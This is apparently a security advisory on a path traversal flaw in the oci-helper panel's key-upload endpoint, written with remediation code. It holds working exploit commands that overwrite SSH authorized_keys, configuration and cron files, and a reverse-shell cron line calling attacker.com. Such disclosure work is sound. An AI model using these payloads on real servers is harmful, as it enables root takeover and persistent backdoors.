# Path Traversal Vulnerability in oci-helper

**Product**: oci-helper
**Version**: V3.2.4
**Affected File**: `src/main/java/com/yohann/ocihelper/service/impl/OciServiceImpl.java`
**Vulnerability Type**: Path Traversal (CWE-22)
**Severity**: High
**CVSS v3.1 Score**: 8.1 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

---

## Product Information

**Product Name**: oci-helper - Oracle Cloud Infrastructure Management Panel
**Vendor**: yohann (GitHub: https://github.com/Yohann0617/oci-helper)
**Repository**: https://github.com/Yohann0617/oci-helper
**Technology Stack**: Spring Boot 3.5.0 + JDK 21 + SQLite + MyBatis Plus

**Description**: oci-helper is a web-based Oracle Cloud Infrastructure (OCI) management panel that provides instance management, network configuration, IP management, task scheduling, and backup/recovery features.

---

## Version and Discoverer

**Affected Version**: V3.2.4 (and likely earlier versions)
**Fixed Version**: Not yet fixed (as of 2025-11-10)
**Submitter**: sh7err@vEcho
**Discovery Date**: 2025-11-10

**Download Links**:
- GitHub Release: https://github.com/Yohann0617/oci-helper/releases/tag/v3.2.4
- Source Code: https://github.com/Yohann0617/oci-helper/archive/refs/tags/v3.2.4.zip

---

## Problem Classification

### Vulnerability Type
**Path Traversal / Directory Traversal (CWE-22)**

### Root Cause
The application fails to properly validate user-supplied filenames when uploading OCI private key files through the `/api/oci/addCfg` endpoint. The vulnerable code directly concatenates user-controlled input (`MultipartFile.getOriginalFilename()`) with the base directory path without any sanitization or validation.

**Vulnerable Code Location**: Line 146 in `OciServiceImpl.java`

```java
String priKeyPath = keyDirPath + File.separator + params.getFile().getOriginalFilename();
File priKey = FileUtil.touch(priKeyPath);
```

The `FileUtil.touch()` method from Hutool library creates the file at the specified path without performing security checks, allowing attackers to write files outside the intended directory.

### Business Impact
An authenticated attacker can exploit this vulnerability to:
- **Arbitrary File Write**: Write malicious files to any location on the server filesystem where the application has write permissions
- **SSH Key Replacement**: Overwrite SSH authorized_keys files to gain unauthorized server access
- **Configuration Tampering**: Modify application configuration files to alter system behavior
- **Privilege Escalation**: Replace system files to escalate privileges to root
- **Persistent Backdoor**: Plant cron jobs or startup scripts for persistent access

---

## Technical Analysis

### Vulnerable Component

**File**: `src/main/java/com/yohann/ocihelper/service/impl/OciServiceImpl.java`
**Method**: `addCfg(AddCfgParams params)`
**Endpoint**: `POST /api/oci/addCfg`
**Authentication Required**: Yes (JWT Bearer token)

### Data Flow Analysis

1. **User Input**: Attacker sends HTTP POST request with multipart/form-data containing a file upload
2. **Filename Extraction**: `params.getFile().getOriginalFilename()` retrieves the user-supplied filename
3. **Path Construction**: Filename is directly concatenated with `keyDirPath` using `File.separator`
4. **File Creation**: `FileUtil.touch(priKeyPath)` creates the file at the constructed path
5. **Content Writing**: File contents are written using `Files.newOutputStream()`

### Missing Security Controls

- ❌ No filename format validation
- ❌ No path traversal character filtering (e.g., `../`, `..\\`)
- ❌ No path canonicalization or normalization
- ❌ No verification that final path is within intended directory
- ❌ No file extension whitelist enforcement

### Code Analysis

**Vulnerable Method**:

```java
@Override
@Transactional(rollbackFor = Exception.class)
public void addCfg(AddCfgParams params) {
    List<OciUser> ociUserList = userService.list(
        new LambdaQueryWrapper<OciUser>()
            .eq(OciUser::getUsername, params.getUsername())
    );
    if (ociUserList.size() != 0) {
        throw new OciException(-1, "当前配置名称已存在");
    }

    // VULNERABLE: Direct concatenation without validation
    String priKeyPath = keyDirPath + File.separator +
                        params.getFile().getOriginalFilename();
    File priKey = FileUtil.touch(priKeyPath);

    try (InputStream inputStream = params.getFile().getInputStream();
         BufferedOutputStream bufferedOutputStream =
             new BufferedOutputStream(Files.newOutputStream(priKey.toPath()))) {
        IoUtil.copy(inputStream, bufferedOutputStream);
    } catch (Exception e) {
        throw new OciException(-1, "写入私钥文件失败");
    }

    // ... subsequent processing ...
}
```

**Parameter Object** (`AddCfgParams.java`):

```java
@Data
public class AddCfgParams {
    @NotBlank(message = "配置名称不能为空")
    private String username;

    @NotBlank(message = "配置不能为空")
    private String ociCfgStr;

    @NotNull(message = "私钥不能为空")
    private MultipartFile file;  // Only validates non-null, no filename validation
}
```

### Attack Vector

The vulnerability can be exploited by manipulating the `filename` parameter in the multipart/form-data request. Since this parameter is entirely controlled by the client, an attacker can specify path traversal sequences.

**Example Path Construction**:
```
keyDirPath = "/app/oci-helper/keys"
malicious filename = "../../../../root/.ssh/authorized_keys"
resulting path = "/app/oci-helper/keys/../../../../root/.ssh/authorized_keys"
normalized path = "/root/.ssh/authorized_keys"
```

---

## Exploitation Details

### Attack Scenario 1: SSH Key Replacement

An attacker with valid authentication credentials can gain root access to the server:

**Step 1**: Generate attacker's SSH key pair
```bash
ssh-keygen -t rsa -b 2048 -f attacker_key -N ""
```

**Step 2**: Send malicious request
```bash
curl -X POST 'http://target:8818/api/oci/addCfg' \
  -H 'Authorization: Bearer eyJ0eXAiOiJKV1QiLC...' \
  -H 'Content-Type: multipart/form-data' \
  -F 'username=backdoor_config' \
  -F 'ociCfgStr=[DEFAULT]
user=ocid1.user.oc1..fake
fingerprint=aa:bb:cc:dd:ee:ff:00:11:22:33:44:55:66:77:88:99
tenancy=ocid1.tenancy.oc1..fake
region=us-ashburn-1
key_file=/tmp/fake.pem' \
  -F 'file=@attacker_key.pub;filename=../../../../root/.ssh/authorized_keys'
```

**Step 3**: Access server via SSH
```bash
ssh -i attacker_key root@target
```

### Attack Scenario 2: Application Configuration Tampering

Overwrite application configuration to modify admin credentials:

```bash
curl -X POST 'http://target:8818/api/oci/addCfg' \
  -H 'Authorization: Bearer eyJ0eXAiOiJKV1QiLC...' \
  -F 'username=evil_config' \
  -F 'ociCfgStr=...' \
  -F 'file=@malicious_config.yml;filename=../../../application.yml'
```

### Attack Scenario 3: Cron Job Backdoor

Plant persistent backdoor via cron:

```bash
# Create malicious cron file
echo "* * * * * root bash -i >& /dev/tcp/attacker.com/4444 0>&1" > backdoor.cron

# Upload to cron.d
curl -X POST 'http://target:8818/api/oci/addCfg' \
  -H 'Authorization: Bearer eyJ0eXAiOiJKV1QiLC...' \
  -F 'username=cron_backdoor' \
  -F 'ociCfgStr=...' \
  -F 'file=@backdoor.cron;filename=../../../../etc/cron.d/backdoor'
```

---

## Proof of Concept

### Prerequisites
- Valid user account with authentication token
- Permission to add OCI configurations
- Network access to the application

### PoC Steps

**1. Prepare test payload**:
```bash
echo "THIS_IS_A_POC_TEST_FILE" > test.pem
```

**2. Execute path traversal attack**:
```bash
curl -X POST 'http://localhost:8818/api/oci/addCfg' \
  -H 'Authorization: Bearer <VALID_JWT_TOKEN>' \
  -H 'Content-Type: multipart/form-data' \
  -F 'username=poc_test' \
  -F 'ociCfgStr=[DEFAULT]
user=ocid1.user.oc1..test
fingerprint=11:22:33:44:55:66:77:88:99:aa:bb:cc:dd:ee:ff:00
tenancy=ocid1.tenancy.oc1..test
region=us-ashburn-1
key_file=/app/oci-helper/keys/../../../tmp/pwned.pem' \
  -F 'file=@test.pem;filename=../../../tmp/pwned.pem'
```

**3. Verify exploitation**:
```bash
ls -la /tmp/pwned.pem
cat /tmp/pwned.pem
# Expected output: THIS_IS_A_POC_TEST_FILE
```

### HTTP Request Example

```http
POST /api/oci/addCfg HTTP/1.1
Host: target:8818
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9...
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="username"

poc_test
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="ociCfgStr"

[DEFAULT]
user=ocid1.user.oc1..test
fingerprint=11:22:33:44:55:66:77:88:99:aa:bb:cc:dd:ee:ff:00
tenancy=ocid1.tenancy.oc1..test
region=us-ashburn-1
key_file=/app/oci-helper/keys/../../../tmp/pwned.pem
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="file"; filename="../../../tmp/pwned.pem"
Content-Type: application/x-pem-file

-----BEGIN PRIVATE KEY-----
MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQC...
-----END PRIVATE KEY-----
------WebKitFormBoundary7MA4YWxkTrZu0gW--
```

### Expected Behavior vs. Actual Behavior

**Expected**: Application should reject filenames containing path traversal sequences and only create files within `/app/oci-helper/keys/` directory.

**Actual**: Application creates files at arbitrary filesystem locations specified by the attacker, potentially overwriting critical system files.

---

## Impact Assessment

### Severity Justification

**CVSS v3.1 Vector**: `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N`
**CVSS Score**: **8.1 (High)**

**Breakdown**:
- **Attack Vector (AV:N)**: Network - Exploitable remotely over HTTP/HTTPS
- **Attack Complexity (AC:L)**: Low - No special conditions required
- **Privileges Required (PR:L)**: Low - Requires valid authentication token
- **User Interaction (UI:N)**: None - No user interaction needed
- **Scope (S:U)**: Unchanged - Impacts resources managed by same authority
- **Confidentiality (C:H)**: High - Can read sensitive files by overwriting and retrieving
- **Integrity (I:H)**: High - Can modify or create arbitrary files
- **Availability (A:N)**: None - Does not directly impact availability

### Real-World Impact

| Impact Category | Severity | Description |
|----------------|----------|-------------|
| **Confidentiality** | High | Can overwrite and exfiltrate sensitive files (SSH keys, certificates) |
| **Integrity** | High | Can modify system configurations, inject malicious code |
| **Privilege Escalation** | Critical | SSH key replacement enables root access |
| **Lateral Movement** | High | Compromised server can be used to attack other systems |
| **Persistence** | High | Cron jobs and startup scripts provide persistent backdoor |
| **Compliance** | High | Violates security standards (PCI-DSS, SOC2, ISO 27001) |

---

## Remediation

### Recommended Fix (Priority 1)

Implement comprehensive filename validation and path sanitization:

```java
@Override
@Transactional(rollbackFor = Exception.class)
public void addCfg(AddCfgParams params) {
    // ... existing validation ...

    // === SECURITY FIX START ===

    // 1. Validate filename exists
    String originalFilename = params.getFile().getOriginalFilename();
    if (originalFilename == null || originalFilename.trim().isEmpty()) {
        throw new OciException(-1, "Filename cannot be empty");
    }

    // 2. Extract only the filename (remove any path components)
    String safeFilename = Paths.get(originalFilename).getFileName().toString();

    // 3. Validate filename format (alphanumeric, underscore, dash, dot only)
    if (!safeFilename.matches("^[a-zA-Z0-9_.-]+$")) {
        throw new OciException(-1, "Invalid filename format");
    }

    // 4. Whitelist file extensions
    String lowerFilename = safeFilename.toLowerCase();
    if (!lowerFilename.endsWith(".pem") && !lowerFilename.endsWith(".key")) {
        throw new OciException(-1, "Only .pem and .key files are allowed");
    }

    // 5. Construct and normalize target path
    Path keyDirNormalized = Paths.get(keyDirPath).normalize().toAbsolutePath();
    Path targetPath = keyDirNormalized.resolve(safeFilename).normalize().toAbsolutePath();

    // 6. Verify target path is within allowed directory
    if (!targetPath.startsWith(keyDirNormalized)) {
        log.error("Path traversal attempt detected! Original: {}, Target: {}",
                  originalFilename, targetPath);
        throw new OciException(-1, "Path traversal attempt detected");
    }

    // 7. Check if file already exists
    if (Files.exists(targetPath)) {
        throw new OciException(-1, "File already exists: " + safeFilename);
    }

    // === SECURITY FIX END ===

    File priKey = targetPath.toFile();
    // ... rest of the method ...
}
```

### Additional Security Measures

1. **Input Validation Layer**: Create a dedicated validator component for file uploads

```java
@Component
public class FileUploadValidator {
    private static final long MAX_FILE_SIZE = 10 * 1024; // 10KB
    private static final Pattern SAFE_FILENAME = Pattern.compile("^[a-zA-Z0-9_.-]+$");
    private static final Set<String> ALLOWED_EXTENSIONS = Set.of(".pem", ".key");

    public void validate(MultipartFile file) {
        // File size check
        if (file.getSize() > MAX_FILE_SIZE) {
            throw new OciException(-1, "File size exceeds limit");
        }

        // Filename validation
        String filename = Paths.get(file.getOriginalFilename()).getFileName().toString();
        if (!SAFE_FILENAME.matcher(filename).matches()) {
            throw new OciException(-1, "Invalid filename format");
        }

        // Extension validation
        String ext = filename.substring(filename.lastIndexOf(".")).toLowerCase();
        if (!ALLOWED_EXTENSIONS.contains(ext)) {
            throw new OciException(-1, "Unsupported file type");
        }
    }
}
```

2. **Audit Logging**: Implement security event logging for file upload operations

```java
@Aspect
@Component
public class FileUploadAuditAspect {
    @AfterReturning("execution(* com.yohann.ocihelper.service.impl.OciServiceImpl.addCfg(..))")
    public void auditFileUpload(JoinPoint joinPoint) {
        AddCfgParams params = (AddCfgParams) joinPoint.getArgs()[0];
        log.info("File upload audit: user={}, filename={}, size={} bytes",
                 params.getUsername(),
                 params.getFile().getOriginalFilename(),
                 params.getFile().getSize());
    }

    @AfterThrowing(pointcut = "execution(* ..addCfg(..))", throwing = "ex")
    public void auditFailedUpload(JoinPoint joinPoint, Exception ex) {
        log.warn("File upload failed: {}", ex.getMessage());
    }
}
```

3. **Alternative: UUID-based Filenames**: Consider using randomly generated filenames instead of user-supplied names

```java
String fileExtension = "";
String originalFilename = params.getFile().getOriginalFilename();
if (originalFilename != null && originalFilename.contains(".")) {
    fileExtension = originalFilename.substring(originalFilename.lastIndexOf("."));
    // Validate extension
    if (!fileExtension.matches("\\.(pem|key)$")) {
        throw new OciException(-1, "Unsupported file type");
    }
}

String safeFilename = UUID.randomUUID().toString() + fileExtension;
Path targetPath = Paths.get(keyDirPath, safeFilename).normalize().toAbsolutePath();

// Store mapping in database
ociUser.setOriginalKeyFilename(originalFilename);
ociUser.setOciKeyPath(targetPath.toString());
```

4. **Runtime Protection**: Deploy with principle of least privilege

```yaml
# docker-compose.yml
services:
  oci-helper:
    security_opt:
      - no-new-privileges:true
      - seccomp:default
    read_only: true
    volumes:
      - ./keys:/app/oci-helper/keys:rw
    user: "1000:1000"  # Non-root user
```

---

## Timeline

- **2025-11-10**: Vulnerability discovered during security audit
- **2025-11-10**: Vulnerability verified and confirmed exploitable
- **2025-11-10**: CVE report prepared and submitted
- **TBD**: Vendor notification (pending)
- **TBD**: Patch development (pending)
- **TBD**: Public disclosure (pending)

---

## References

- [CWE-22: Improper Limitation of a Pathname to a Restricted Directory](https://cwe.mitre.org/data/definitions/22.html)
- [OWASP Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- [OWASP File Upload Security](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html)
- [CVSS v3.1 Calculator](https://www.first.org/cvss/calculator/3.1)
- [oci-helper GitHub Repository](https://github.com/Yohann0617/oci-helper)

---

## Credits

**Discoverer**: sh7err@vEcho
**Report Date**: 2025-11-10
**Report Version**: 1.0
